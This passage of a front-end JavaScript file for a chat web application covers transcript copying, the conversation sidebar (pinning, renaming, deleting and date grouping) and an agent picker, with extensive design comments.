    // Snapshotted here, alongside chatId, for the same reason: this is the
    // last point before any `await` where #chat-thread-title is guaranteed to
    // still belong to the conversation being exported. Opening another chat
    // during the fetch below repaints that heading via setThreadTitle(), so
    // reading it any later would pair the new conversation's title with this
    // one's messages and session id.
    const title = ($("chat-thread-title")?.textContent || "Untitled chat").trim();
    btn.disabled = true;
    try {
      if (window.ClipboardItem && navigator.clipboard?.write && window.isSecureContext) {
        // `navigator.clipboard.write` has to be *called* synchronously inside
        // the click handler — an `await` before it (the fetch below is a real
        // network round-trip) drops the transient user-activation WebKit
        // requires, and the button reports "Couldn't copy to clipboard" even
        // though everything else worked. ClipboardItem lets the *value*
        // resolve later while the write call itself starts right here.
        const md = fetchTranscriptMarkdown(chatId, title);
        // `new ClipboardItem({...: blob})` hands the constructor a *derived*
        // promise. If the constructor or `.write()` throws synchronously
        // before ever consuming it (a stricter implementation can refuse a
        // promise-valued entry outright), nothing else has a handler on
        // `blob` — a later `md` rejection would then surface as an
        // unhandled rejection independent of the try/catch below. Attach a
        // no-op handler unconditionally so that can never happen.
        const blob = md.then((text) => new Blob([text], { type: "text/plain" }));
        blob.catch(() => {});
        try {
          await navigator.clipboard.write([new ClipboardItem({ "text/plain": blob })]);
          showToast("Transcript copied", "ok");
          return;
        } catch (writeErr) {
          // The rejection could be the write itself (a NotAllowedError from
          // the permission gate, or a synchronous constructor refusal) or
          // `md` failing underneath it (the fetch itself failed) — only the
          // first case has a working fallback, so tell them apart before
          // reporting anything.
          let text;
          try {
            text = await md;
          } catch (_) {
            showToast("Couldn't read this conversation", "error");
            return;
          }
          const ok = await copyTextToClipboard(text);
          showToast(ok ? "Transcript copied" : "Couldn't copy to clipboard", ok ? "ok" : "error");
          return;
        }
      }
      // ClipboardItem unavailable (older Firefox, non-secure context): fall
      // back to the pre-fetch-then-copy path, which still works everywhere
      // that got a real click but loses the gesture on stricter browsers.
      const md = await fetchTranscriptMarkdown(chatId, title);
      const ok = await copyTextToClipboard(md);
      showToast(ok ? "Transcript copied" : "Couldn't copy to clipboard", ok ? "ok" : "error");
    } catch (_) {
      showToast("Couldn't read this conversation", "error");
    } finally {
      btn.disabled = false;
    }
  });
}

function readCapabilitySnapshot() {
  const blob = document.getElementById("chat-capabilities-data");
  if (!blob) return null;
  try {
    return JSON.parse(blob.textContent);
  } catch (err) {
    console.warn("chat-capabilities-data parse failed", err);
    return null;
  }
}

function renderCapabilities() {
  const snap = readCapabilitySnapshot();
  if (!snap) return;

  // --- Data card ---
  const total = snap.tables_total || 0;
  const bySource = snap.tables_by_source || {};
  const sourceCount = Object.keys(bySource).length;
  const dataSummary = $("cap-data-summary");
  if (dataSummary) {
    dataSummary.textContent = total > 0
      ? `You can query ${total} table${total === 1 ? "" : "s"} across ${sourceCount} data source${sourceCount === 1 ? "" : "s"}.`
      : "No tables in your catalog yet — an admin grants access on your group's Access tab.";
  }
  const dataUl = $("cap-data-sources");
  if (dataUl && total > 0) {
    dataUl.innerHTML = "";
    for (const [src, n] of Object.entries(bySource)) {
      const li = document.createElement("li");
      const code = document.createElement("code");
      code.textContent = src;
      li.appendChild(code);
      li.appendChild(document.createTextNode(` — ${n} table${n === 1 ? "" : "s"}`));
      dataUl.appendChild(li);
    }
  }

  // --- Marketplace card ---
  const plugins = snap.plugins || [];
  const mpCount = snap.marketplace_count || 0;
  const mpSummary = $("cap-marketplace-summary");
  if (mpSummary) {
    mpSummary.textContent = plugins.length > 0
      ? `${plugins.length} plugin${plugins.length === 1 ? "" : "s"} installed across ${mpCount} marketplace${mpCount === 1 ? "" : "s"}.`
      : "No marketplace plugins installed yet.";
  }
  const mpUl = $("cap-marketplace-list");
  if (mpUl && plugins.length > 0) {
    mpUl.innerHTML = "";
    for (const p of plugins.slice(0, 5)) {
      const li = document.createElement("li");
      const code = document.createElement("code");
      code.textContent = p.name || "?";
      li.appendChild(code);
      if (p.tagline) li.appendChild(document.createTextNode(" — " + p.tagline));
      mpUl.appendChild(li);
    }
    if (plugins.length > 5) {
      const li = document.createElement("li");
      li.textContent = `… and ${plugins.length - 5} more`;
      mpUl.appendChild(li);
    }
  }
}

// Suggested-prompt clicks pre-fill the textarea + submit.
function wireSuggestionButtons() {
  document.querySelectorAll(".cloud-chat-cap-suggest").forEach(btn => {
    btn.addEventListener("click", () => {
      const text = btn.dataset.prompt;
      if (!text) return;
      const ta = $("chat-input");
      if (!ta) return;
      ta.value = text;
      ta.focus();
      // Auto-submit on click to keep the empty-state flow fast.
      const form = $("chat-form");
      if (form) form.dispatchEvent(new SubmitEvent("submit", { cancelable: true }));
    });
  });
}

async function api(path, init = {}) {
  const r = await fetch(path, {
    headers: { "Content-Type": "application/json" },
    credentials: "same-origin",
    ...init,
  });
  if (!r.ok) throw new Error(`${r.status} ${r.statusText}`);
  // 204 No Content (and any empty 2xx) — DELETE /sessions/{id} returns
  // this. Calling .json() on an empty body throws "unexpected end of
  // data", which is what surfaced as `Could not delete: JSON.parse: …`.
  if (r.status === 204 || r.headers.get("content-length") === "0") return null;
  return r.json();
}

// In-memory cache of the last sidebar fetch so the Cmd+K palette can
// filter without a round-trip and openSession can resolve titles.
let _sessionsCache = [];

/** How many recent conversations the RAIL shows under its pinned shelf. The
 *  rest are reached through the rail's Chats destination row → /chats.
 *
 *  Duplicated from rail_history.js (which owns the rationale, and renders this
 *  same list on every page except this one) for the same reason the row
 *  renderer is duplicated: the two files never load together as modules, and a
 *  rail whose recent list is five rows on /library and unbounded on /chat is
 *  one list with two contradictory contracts. Keep the two in step.
 *  Topnav is unaffected — its conversations column is full-height and uncapped. */
const RAIL_RECENT_LIMIT = 5;

async function loadSidebar() {
  const list = await api("/api/chat/sessions");
  _sessionsCache = list;
  const ul = $("chat-list");
  // No list at all: the rail gates its whole chat chrome on `can_chat`
  // (_app_rail.html), which reads has_explicit_grant — while this route and
  // the chat API gate on can_access, where god-mode short-circuits. So an
  // admin without an explicit chat grant gets a fully WORKING /chat with no
  // sidebar to draw into; bail after caching the fetch (the Cmd+K palette
  // and openSession's title lookup read _sessionsCache). rail_history.js
  // guards its renderer on the same condition.
  if (!ul) return;
  // The rail gives pinned conversations a SECTION of their own above the feed
  // (<ul id="pinned-chat-list">, _app_rail.html) — so when that list is present
  // the pinned rows go there and _groupSessionsByDate is asked not to hoist a
  // "Pinned" group into this one. The topnav sidebar has no such list, keeps the
  // hoisted group, and is untouched by any of this.
  const pinnedUl = $("pinned-chat-list");
  // The row menu is body-appended, not a child of the row — so a panel left
  // open across a re-render would hover over a row it no longer belongs to.
  if (window.chatRowMenu) window.chatRowMenu.close();
  ul.innerHTML = "";
  if (pinnedUl) {
    pinnedUl.innerHTML = "";
    for (const s of list.filter(s => s.pinned)) pinnedUl.appendChild(_makeSidebarItem(s));
  }
  if (pinnedUl) {
    // RAIL — the presence of the Pinned section's own list is what identifies
    // it. A capped, ungrouped "Recent" feed: the server already sorts
    // pinned-first then most-recent-first, so the head of the list is the most
    // recent work, and the rest lives on /chats behind the rail's Chats row.
    // See RAIL_RECENT_LIMIT for why a cap is right here and was wrong before
    // that page existed. Pins are above and uncapped.
    const recent = list.filter(s => !s.pinned).slice(0, RAIL_RECENT_LIMIT);
    for (const s of recent) ul.appendChild(_makeSidebarItem(s));
  } else {
    // TOPNAV — the full-height conversations column, unchanged: five date
    // buckets with pinned hoisted into a leading labelled group, because
    // twenty titles at once are what the labels make scannable.
    for (const group of _groupSessionsByDate(list)) {
      if (group.label) {
        const header = document.createElement("li");
        header.className = "cloud-chat-list-group-header";
        // Marks the hoisted "Pinned" group so the sheet can style that header
        // differently from the date ones.
        if (group.pinnedGroup) header.classList.add("is-pinned-group");
        header.setAttribute("role", "presentation");
        header.textContent = group.label;
        ul.appendChild(header);
      }
      for (const s of group.items) ul.appendChild(_makeSidebarItem(s));
    }
  }
  const empty = $("cloud-chat-empty-state");
  if (empty) empty.hidden = list.length > 0;
  // A successful load clears a FAILED state left over from an earlier
  // attempt (TCRD-207/DES-153) — reaching this line means the fetch above
  // resolved, so whatever was wrong before no longer is.
  const failed = $("cloud-chat-failed-state");
  if (failed) failed.hidden = true;
  // The rail's section chrome (reveal Pinned once it has rows, stand Chats down
  // when everything is pinned, re-apply each section's persisted open state) has
  // ONE owner — rail_history.js, loaded on every rail page including this one.
  // Absent under topnav, hence the guard.
  if (window.railChatSections) window.railChatSections.sync();
  // If the user collapsed the sidebar earlier, re-swap each newly
  // rendered label for its initial. ``applySidebarCollapse`` is a
  // no-op when the persisted state is "expanded", so safe to always
  // call here. Defined later in the file but hoisted by ``function``
  // declaration so the call works at load time.
  if (typeof applySidebarCollapse === "function") {
    applySidebarCollapse(isSidebarCollapsed());
  }
}

/** Single sidebar <li> for a session. Pulled out so the date-group
 *  loop above stays readable.
 *
 *  Keyboard-accessible: ``role="button"`` + ``tabindex="0"`` + Enter
 *  and Space handlers. Without these, Tab skips every conversation
 *  (the `<li onclick>` pattern doesn't put the element in the focus
 *  ring) — a hard a11y bug that left screen-reader and
 *  keyboard-only users unable to open a session. */
/** Pushpin glyph for the pin toggle. Duplicated in rail_history.js's copy of
 *  the row renderer (same reason that whole function is duplicated: the rail
 *  script must render identical markup on pages where chat.js isn't loaded).
 *  Outline by default; the CSS fills it on the pressed state. */
const PIN_SVG =
  '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" ' +
  'stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">' +
  '<path d="M12 17v5"/>' +
  '<path d="M9 10.8a2 2 0 0 1-1.1 1.8l-1.8.9A2 2 0 0 0 5 15.2V16a1 1 0 0 0 1 1h12a1 1 0 0 0 1-1v-.8' +
  'a2 2 0 0 0-1.1-1.7l-1.8-.9A2 2 0 0 1 15 10.8V7a1 1 0 0 1 1-1 2 2 0 0 0 0-4H8a2 2 0 0 0 0 4 1 1 0 0 1 1 1z"/>' +
  "</svg>";

function _makeSidebarItem(s) {
  const li = document.createElement("li");
  if (s.id === currentChatId) li.classList.add("is-active");
  li.dataset.id = s.id;
  // `data-pinned` is the cross-renderer contract rail.css keys off (the pin
  // button stays visible on a pinned row) — rail_history.js stamps it the same
  // way on the pages where IT draws this list, so both agree.
  if (s.pinned) {
    li.dataset.pinned = "1";
    li.classList.add("is-pinned");
  }
  li.title = s.title || `Untitled · ${s.id}`;
  li.setAttribute("role", "button");
  li.tabIndex = 0;
  li.setAttribute("aria-label", `Open ${s.title || "untitled conversation"}`);
  li.onclick = () => openSession(s.id);
  li.addEventListener("keydown", (e) => {
    if (e.key === "Enter" || e.key === " ") {
      e.preventDefault();
      openSession(s.id);
    }
  });

  const label = document.createElement("span");
  label.className = "cloud-chat-list-label";
  label.textContent = s.title || "Untitled chat";
  li.appendChild(label);

  // Cross-surface origin pill. Slack-originated sessions (slack_dm /
  // slack_thread) get a small, non-interactive "Slack" text pill so the
  // user can tell at a glance which conversations came in over Slack vs
  // the web composer. Text, not a brand icon — no asset bundled, satisfies
  // the design-system contract. Unknown / undefined surface → no pill
  // (fail-closed: an older server that doesn't emit `surface` shows the
  // plain web style).
  if (s.surface === "slack_dm" || s.surface === "slack_thread") {
    const badge = document.createElement("span");
    badge.className = "cloud-chat-surface-badge";
    badge.textContent = "Slack";
    badge.setAttribute("aria-hidden", "true");  // label already names the row
    li.appendChild(badge);
  }

  // Paused badge: shown when the server reports sandbox_paused_at is set,
  // indicating the session's sandbox is memory-snapshotted and will resume
  // on the next connect or message.
  if (s.paused) {
    const pausedBadge = document.createElement("span");
    pausedBadge.className = "cloud-chat-paused-badge";
    pausedBadge.textContent = "paused";
    pausedBadge.setAttribute("aria-label", "session paused");
    li.appendChild(pausedBadge);
  }

  // Pinned-state indicator — not a control (the pin ACTION is in the row menu).
  // Without it a pinned row is indistinguishable from any other once the
  // "Pinned" group header has scrolled out of view. aria-hidden: the group
  // header already names the state.
  if (s.pinned) {
    const flag = document.createElement("span");
    flag.className = "cloud-chat-pin-flag";
    flag.setAttribute("aria-hidden", "true");
    flag.innerHTML = PIN_SVG;
    li.appendChild(flag);
  }

  // One "⋮" for all three row actions (Pin/Unpin · Rename · Delete), from the
  // shared component so this menu and rail_history.js's are the same menu.
  // Guarded: if the component didn't load the row still opens its conversation.
  if (window.chatRowMenu) {
    li.appendChild(
      window.chatRowMenu.trigger({
        session: s,
        onPin: (pinned) => setSessionPinned(s.id, pinned),
        onRename: () => renameSessionPrompt(s),
        onDelete: () => deleteSession(s.id),
      }),
    );
  }
  return li;
}

/** Group a flat sessions list into [{label, items}, …] buckets
 *  ordered most-recent-first. TOPNAV ONLY.
 *
 *  Topnav's conversations column is full-height and exists to hold
 *  conversations and nothing else, so five date buckets (Today /
 *  Yesterday / Earlier this week / Earlier this month / Older) are
 *  worth their rows: you can see twenty titles at once, and the labels
 *  are what let you scan for "the one from Tuesday".
 *
 *  The rail deliberately does NOT come through here. It shows the pinned
 *  shelf plus RAIL_RECENT_LIMIT recent rows and sends the rest to
 *  /chats, and at five rows a date header is labelling a boundary the
 *  list is too short to have. It once had a two-bucket variant of this
 *  function (an unlabelled recent bucket + "Older"); that went with the
 *  headers. See loadSidebar's rail branch and rail_history.js.
 *
 *  User-pinned sessions are taken OUT of their date bucket and hoisted
 *  into a leading "Pinned" group — a chat appears under Pinned or under
 *  its date, never both. Pinned keeps its label: it is the only group
 *  that breaks the chronology, so it is the only one a reader cannot
 *  infer from position.
 *
 *  Buckets with no items are dropped so the sidebar doesn't render
 *  an empty header. Sort within each bucket is by last_message_at
 *  (server-side already sorts most-recent-first across the whole
 *  list; we just preserve that order). */
function _groupSessionsByDate(sessions) {
  const now = new Date();
  const startOfToday = new Date(now);
  startOfToday.setHours(0, 0, 0, 0);
  const startOfYesterday = new Date(startOfToday);
  startOfYesterday.setDate(startOfYesterday.getDate() - 1);
  const startOfWeek = new Date(startOfToday);
  // ISO week — Monday is day 1; getDay() returns 0=Sun … 6=Sat.
  const dow = (startOfWeek.getDay() + 6) % 7;
  startOfWeek.setDate(startOfWeek.getDate() - dow);
  const startOfMonth = new Date(startOfToday);
  startOfMonth.setDate(startOfMonth.getDate() - 30);

  const groups = [
    { label: "Today",              items: [], threshold: startOfToday },
    { label: "Yesterday",          items: [], threshold: startOfYesterday },
    { label: "Earlier this week",  items: [], threshold: startOfWeek },
    { label: "Earlier this month", items: [], threshold: startOfMonth },
    { label: "Older",              items: [], threshold: new Date(0) },
  ];
  const pinned = { label: "Pinned", items: [], pinnedGroup: true };
  for (const s of sessions) {
    // Pinned rows never fall through to a date bucket — they are hoisted into
    // the leading group instead, so a conversation is never listed twice.
    if (s.pinned) { pinned.items.push(s); continue; }
    const ts = s.last_message_at || s.started_at;
    const d = ts ? new Date(ts) : new Date(0);
    for (const g of groups) {
      if (d >= g.threshold) { g.items.push(s); break; }
    }
  }
  return [pinned, ...groups].filter(g => g.items.length > 0);
}

/** Pin or unpin a conversation (PUT /api/chat/sessions/{id}/pin), then
 *  re-render the sidebar so the row moves into (or out of) the Pinned
 *  group. Pin state lives on the server, so it follows the user across
 *  devices and is shared with the rail's own renderer. */
async function setSessionPinned(chatId, pinned) {
  try {
    await api(`/api/chat/sessions/${chatId}/pin`, {
      method: "PUT",
      body: JSON.stringify({ pinned }),
    });
  } catch (err) {
    showToast(`Could not ${pinned ? "pin" : "unpin"}: ${err.message}`, "error");
    return;
  }
  await loadSidebar();
}

/** Rename a conversation (PUT /api/chat/sessions/{id}/title) from the row
 *  menu. Uses the app-wide promptModal rather than an inline edit so the
 *  focus/Escape handling is the one every other dialog in the app uses.
 *  Reuses applySessionRename for the DOM update — the same path the
 *  server-pushed Haiku auto-title takes — so the sidebar row, the Cmd+K
 *  cache and the thread header all move together. */
async function renameSessionPrompt(s) {
  if (typeof window.promptModal !== "function") return;
  const next = await window.promptModal({
    title: "Rename conversation",
    message: "This is the name shown in the history panel.",
    defaultValue: s.title || "",
    placeholder: "Conversation name",
    confirmText: "Rename",
  });
  // null = cancelled/Escape. Unchanged or blank-only is a no-op rather than a
  // request the server would just 400.
  if (next === null) return;
  const title = next.trim();
  if (!title || title === (s.title || "")) return;
  try {
    await api(`/api/chat/sessions/${s.id}/title`, {
      method: "PUT",
      body: JSON.stringify({ title }),
    });
  } catch (err) {
    showToast(`Could not rename: ${err.message}`, "error");
    return;
  }
  applySessionRename({ chat_id: s.id, title });
  // Re-render too: the row may have to move (a rename doesn't change its
  // bucket, but applySessionRename only patches the label in place and the
  // cached session object behind the menu still holds the old title).
  await loadSidebar();
}

/** Soft-archive a session via DELETE /api/chat/sessions/{id}. If the
 *  caller is currently viewing the session they're deleting, swap them
 *  out to the empty-state shell so the main panel doesn't keep
 *  showing a dead conversation.
 *
 *  Confirms first: Delete sits in the row menu one keystroke ("D") away
 *  from Pin and Rename, so an unconfirmed destructive action would be a
 *  slip away. Matches rail_history.js's copy of the same flow. */
async function deleteSession(chatId) {
  if (typeof window.confirmModal === "function") {
    const cached = _sessionsCache.find(s => s.id === chatId);
    const name = (cached && cached.title) || "this conversation";
    const ok = await window.confirmModal({
      title: "Delete conversation?",
      message: `"${name}" will be permanently deleted.`,
      confirmText: "Delete",
      danger: true,
    });
    if (!ok) return;
  }
  try {
    await api(`/api/chat/sessions/${chatId}`, { method: "DELETE" });
  } catch (err) {
    showToast(`Could not delete: ${err.message}`, "error");
    return;
  }
  await loadSidebar();
  if (currentChatId === chatId) {
    currentChatId = null;
    markActiveSidebar(null);
    if (ws) { ws.close(); ws = null; }
    $("chat-messages").innerHTML = "";
    setStatus("");
    setThreadTitle(null);
    showCapabilities();
  }
  showToast("Conversation deleted", "ok");
}

/** Toggle the `.is-active` class on the sidebar item matching ``chatId``.
 *  Called from openSession + newChat so the sidebar always reflects the
 *  conversation currently visible in the main panel. Safe to call when
 *  ``chatId`` is null — clears every highlight. */
function markActiveSidebar(chatId) {
  // Both lists: under rail the open conversation may be a pinned one, living in
  // the rail's Pinned section rather than in #chat-list (see loadSidebar).
  for (const li of _sidebarRows()) {
    li.classList.toggle("is-active", li.dataset.id === chatId);
  }
}

/** Every conversation row currently in the sidebar, across both lists —
 *  #chat-list plus the rail's #pinned-chat-list when that section is
 *  rendered. Anything that looks a row up by id has to go through this,
 *  or pinned conversations silently stop responding to it (highlight,
 *  live rename, collapse-to-initials). */
function _sidebarRows() {
  const rows = [];
  for (const id of ["chat-list", "pinned-chat-list"]) {
    const ul = document.getElementById(id);
    if (ul) rows.push(...ul.querySelectorAll("li[data-id]"));
  }
  return rows;
}

/** `?agent=<slug>` on /chat — arriving from the Chat button on an agent card.
 *
 * Read once and consumed: the slug picks the agent this session RUNS AS, and
 * `chat_sessions.agent_id` is only written at INSERT, so it applies to the
 * session being created and not to every later "New chat" in the same tab.
 * (Switching persona mid-conversation is a separate, larger feature.) */
function _takeAgentSlugFromUrl() {
  try {
    const url = new URL(window.location.href);
    const slug = url.searchParams.get("agent");
    if (!slug) return null;
    url.searchParams.delete("agent");
    window.history.replaceState({}, "", url.toString());
    return slug;
  } catch (_) {
    return null;
  }
}

// --- Composer agent picker ------------------------------------------------
// Which of the caller's agents a conversation runs AS. The runtime for this
// has existed since the agent-as-API work (`POST /api/chat/sessions` takes an
// `agent_slug`, and `chat_sessions.agent_id` has recorded the answer since
// v101) — but the only door into it was the Chat button on an agent card, and
// nothing in the chat window ever said who you were talking to.
//
// An agent is bound at session CREATION: its scope, memory notebook, pinned
// model and token budget are fixed for the life of the session. So this
// control cannot re-target a conversation, and it does not pretend to —
// choosing an agent starts a NEW session as that agent, and once a
// conversation has turns the button goes disabled with a title that names the
// way out. An EMPTY session is not a dead end though: picking a different
// agent there just spawns another one, and `ChatManager.create_session`
// already soft-archives the orphan (the same GC that keeps repeated "+ New
// chat" clicks from littering the sidebar).

/** Resolves when the /api/v1/agents fetch has settled (successfully or not).
 * `loadAndRenderHistory` awaits it before looking up an agent's greeting: the
 * `/chat?agent=<slug>` deep link and a picker click both open a session within
 * the same tick as the fetch, and without this the greeting silently lost the
 * race about as often as it won it. */
let _agentsLoaded = Promise.resolve();

/** The caller's OWN agents, newest-listed-first as the API returns them.
 * Deliberately excludes agents merely SHARED with them: `_resolve_agent_id`
 * in app/api/chat.py resolves a slug against the caller's own rows only, so
 * offering a shared agent here would produce a 404 on click. */
let _agentsCache = [];
/** `agents.id` this conversation runs as — null before any session opens. */
let _currentAgentId = null;
/** Whether the open conversation has any turns yet. Drives the disabled
 * state: the rule is "has this conversation started", not "does a session row
 * exist", because a session row exists the moment you click "+ New chat". */
let _sessionHasTurns = false;

/** The conversation has started: settle the agent AND raise the thread
 * header.
 *
 * These were two independent decisions and they disagreed. `openSession`
 * titled every session it opened — "Untitled chat" when there was nothing
 * better — which put `.has-thread` on the shell and swapped the centred
 * empty-state layout for the conversation one. But switching agent on an
 * empty dashboard goes through `newChat()` to get a session for the new
 * agent, so picking an agent redrew the page as a conversation that did not
 * exist: thread header, Copy transcript, composer pushed to the foot, and
 * the dashboard still sitting there underneath.
 *
 * The distinction the picker already drew is the right one everywhere — "has
 * this conversation started", not "does a session row exist" — so the header
 * is driven from here too, and a session with no turns keeps the empty-state
 * layout it had before the switch. */
function _markConversationStarted() {
  _sessionHasTurns = true;
  _syncAgentPicker();
  const meta = _sessionsCache.find(s => s.id === currentChatId);
  setThreadTitle(meta && meta.title ? meta.title : "Untitled chat");
}

/** The inverse: no turns, so the empty-state dashboard and the live picker,
 * and no thread chrome for a transcript that does not exist yet. */
function _markConversationNotStarted() {
  _sessionHasTurns = false;
  _syncAgentPicker();
  setThreadTitle(null);
}

/** What to call an agent in the picker. The seeded default agent is named the
 * literal "Default" (`agents_repo().get_or_create_default`), which is a poor
 * answer to "who am I talking to?" — show the instance brand there instead.
 * A default the owner has since RENAMED keeps its own name. */
/** How long a name may be before the pill abbreviates it. Sized to the widest
 *  name that fits the 9rem cap at the button's weight without ellipsis. */
const AGENT_LABEL_MAX = 14;

/** The FULL name, for the menu, the in-conversation label and the title
 *  attribute — everywhere there is room to say it.
 *
 *  The default agent is "Default", not the brand. It used to render as "Agnes",
 *  which read more naturally on its own but was the odd one out once the caller
 *  had named agents of their own ("Agnes" beside "Delivery Health" looks like a
 *  different kind of thing), and it disagreed with the /agents page, where the
 *  same row is called Default. One name per agent, everywhere. */
function _agentLabel(a, brand) {
  if (!a) return brand;
  if (a.is_default && (!a.name || a.name === "Default")) return "Default";
  return a.name || "Untitled agent";
}

/** The label as the PILL shows it: initials once a name is long enough to crowd
 *  the composer ("Finance Proposals" → "FP").
 *
 *  Initials, not an ellipsis, so the pill's width is stable across agents rather
 *  than growing to the cap — the trade is that two names sharing initials look
 *  alike in the pill. The full name is always one hover (title) or one click
 *  (the menu, which ticks the current row) away, and the in-conversation label
 *  spells it out, so nothing depends on reading the pill alone.
 *
 *  Single long word has no initials to take, so it falls back to the CSS
 *  ellipsis rather than rendering one lonely letter. */
function _agentPillLabel(name) {
  const full = String(name || "").trim();
  if (full.length <= AGENT_LABEL_MAX) return full;
  const words = full.split(/\s+/).filter(Boolean);
  if (words.length < 2) return full;
  return words.slice(0, 3).map(w => w[0].toUpperCase()).join("");
}

function _agentById(id) {
  return id ? _agentsCache.find(a => a.id === id) || null : null;
}

function _defaultAgent() {
  return _agentsCache.find(a => a.is_default) || null;
}

/** Which of the two agent elements is showing, and what it says.
 *
 * Before the first turn there is a real choice, so the picker button shows.
 * After it there is not — the agent is fixed at session creation — so the
 * button is swapped for a plain label. A disabled button was the first
 * version of this and it was worse in two ways: it still announced itself as
 * a button to assistive tech, and it still looked like something to click.
 *
 * The button keeps its server-rendered brand text as the fallback name, so a
 * failed /api/v1/agents fetch degrades to today's behaviour rather than a
 * blank pill. */
function _syncAgentPicker() {
  const btn = $("chat-agent-btn");
  if (!btn) return;
  const btnLabel = $("chat-agent-btn-label");
  const staticLabel = $("chat-agent-label");
  if (!btn.dataset.fallbackLabel) {
    btn.dataset.fallbackLabel = btnLabel ? btnLabel.textContent : "Agnes";
  }
  const agent = _agentById(_currentAgentId) || _defaultAgent();
  const name = _agentLabel(agent, btn.dataset.fallbackLabel);
  const pill = _agentPillLabel(name);
  if (btnLabel) btnLabel.textContent = pill;
  // When the pill abbreviates, the title is the only place the full name shows
  // on hover — so say it there rather than repeating the generic instruction.
  btn.title = pill === name
    ? "Choose which agent to chat with"
    : `${name} — choose which agent to chat with`;
  btn.hidden = _sessionHasTurns;
  if (staticLabel) {
    staticLabel.textContent = name;
    staticLabel.title = `This conversation runs as ${name} — start a new chat to switch agent`;
    staticLabel.hidden = !_sessionHasTurns;
  }
  if (_sessionHasTurns) _closeAgentMenu();
}

function _closeAgentMenu() {
  const btn = $("chat-agent-btn");
  const menu = $("chat-agent-menu");
  if (!btn || !menu) return;
  menu.hidden = true;
  btn.classList.remove("is-open");
  btn.setAttribute("aria-expanded", "false");
}

function _renderAgentMenu() {
  const menu = $("chat-agent-menu");
  if (!menu) return;
  menu.innerHTML = "";
  if (!_agentsCache.length) {
    const note = document.createElement("li");
    note.className = "cloud-chat-agent-menu-note";
    // No "build one on the Agents page" instruction any more: the create row
    // below IS that path, so the note only has to state the fact.
    note.textContent = "No agents yet.";
    menu.appendChild(note);
  }
  const currentId = (_agentById(_currentAgentId) || _defaultAgent() || {}).id;
  for (const a of (_agentsCache.length ? _agentsCache : [])) {
    const li = document.createElement("li");
    li.className = "cloud-chat-agent-menu-item";
    if (a.id === currentId) li.classList.add("is-current");
    li.setAttribute("role", "menuitem");
    li.tabIndex = 0;
    li.dataset.agentSlug = a.slug || "";

    const tick = document.createElementNS("http://www.w3.org/2000/svg", "svg");
    tick.setAttribute("class", "cloud-chat-agent-menu-item-tick");
    tick.setAttribute("viewBox", "0 0 24 24");
    tick.setAttribute("fill", "none");
    tick.setAttribute("aria-hidden", "true");
    const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
    path.setAttribute("d", "M5 13l4 4L19 7");
    path.setAttribute("stroke", "currentColor");
    path.setAttribute("stroke-width", "2.4");
    path.setAttribute("stroke-linecap", "round");
    path.setAttribute("stroke-linejoin", "round");
    tick.appendChild(path);
    li.appendChild(tick);

    // textContent throughout — agent name/role are user-authored strings and
    // this menu is rebuilt from the API on every open.
    const text = document.createElement("span");
    text.className = "cloud-chat-agent-menu-item-text";
    const name = document.createElement("span");
    name.className = "cloud-chat-agent-menu-item-label";
    const btnEl = $("chat-agent-btn");
    name.textContent = _agentLabel(a, (btnEl && btnEl.dataset.fallbackLabel) || "Agnes");
    text.appendChild(name);
    const hint = a.role || (a.is_default ? "Your default agent" : "");
    if (hint) {
      const hintEl = document.createElement("span");
      hintEl.className = "cloud-chat-agent-menu-item-hint";
      hintEl.textContent = hint;
      text.appendChild(hintEl);
    }
    li.appendChild(text);

    const choose = () => {
      _closeAgentMenu();
      if (!a.slug) return;
      hideCapabilities();
      newChat(a.slug).catch((err) => {
        console.error("chat: could not start a session as agent", err);
        if (window.appToast) {
          window.appToast({ kind: "error", msg: "Could not start a chat with that agent." });
        }
      });
    };
    li.addEventListener("click", choose);
    li.addEventListener("keydown", (e) => {
      if (e.key === "Enter" || e.key === " ") { e.preventDefault(); choose(); }
    });
    menu.appendChild(li);
  }

  /* …and one row that is not an agent: the way to make another.
   *
   * It belongs here because this menu is where the caller finds out their
   * agents are not enough — you go looking for the one that answers this
   * question, do not find it, and the next move should be in reach rather than
   * back through the rail to /agents. Standard account-switcher shape: the set,
   * then "add one".
   *
   * `?new=1` is the SAME path the Agents page's own "New agent" card takes
   * (agents.html strips the param and calls createAgent, so the server mints
   * the row) — not a second way to create an agent, just a second door to the
   * one that exists. An <a>, so it is a real link: middle-click and
   * open-in-new-tab work, and it needs no JS to function.
   *
   * Separated from the list by a rule, because it is a different KIND of row:
   * every item above it switches this conversation, this one leaves the page. */
  const create = document.createElement("li");
  create.className = "cloud-chat-agent-menu-create";
  create.setAttribute("role", "none");
  const link = document.createElement("a");
  link.href = "/agents?new=1";
  link.setAttribute("role", "menuitem");
  link.className = "cloud-chat-agent-menu-create-link";
  const plus = document.createElementNS("http://www.w3.org/2000/svg", "svg");
  plus.setAttribute("class", "cloud-chat-agent-menu-create-ico");
  plus.setAttribute("viewBox", "0 0 24 24");
  plus.setAttribute("fill", "none");
  plus.setAttribute("aria-hidden", "true");
  const pp = document.createElementNS("http://www.w3.org/2000/svg", "path");
  pp.setAttribute("d", "M12 5v14M5 12h14");
  pp.setAttribute("stroke", "currentColor");
  pp.setAttribute("stroke-width", "2");
  pp.setAttribute("stroke-linecap", "round");
  plus.appendChild(pp);
  link.appendChild(plus);
  const ctext = document.createElement("span");
  ctext.textContent = "Create new agent";
  link.appendChild(ctext);
  create.appendChild(link);
  menu.appendChild(create);
}

/** (Re)fetch the caller's agents. Never throws: a list that cannot be loaded
 * leaves the composer exactly as it is today — brand label, no menu — because
 * failing to enumerate agents must not block chatting with the default one. */
async function _refreshAgents() {
  try {
    // Re-pointed from this page's own now-deleted /api/agents (Task C1.2) —
    // /api/v1/agents absorbed its wire shape, `mine` included, in Task C1.1.
    const res = await api("/api/v1/agents");
    // Ready agents only — a draft is unfinished by its author's own say-so,
    // and offering one here invites a conversation with something half-built.
    // The picker is the "who am I talking to" control, not the agent index;
    // /agents is where drafts belong, beside the thing that finishes them.
    //
    // `status`/`is_default` survive the move: v1's `_serialize` starts from
    // `dict(row)`, so both columns pass through unchanged.
    //
    // `|| a.is_default` is a BACKSTOP, not the mechanism. The default agent
    // is seeded `status: "ready"` and an older draft one is promoted on first
    // touch (`AgentsRepository.get_or_create_default`), so it passes the
    // status test on its own. This keeps it from being dropped in the window
    // before that heal lands — a picker without the default is a one-way
    // switch, the same dead end the on-open refresh exists to avoid.
    _agentsCache = (res.data || []).filter(
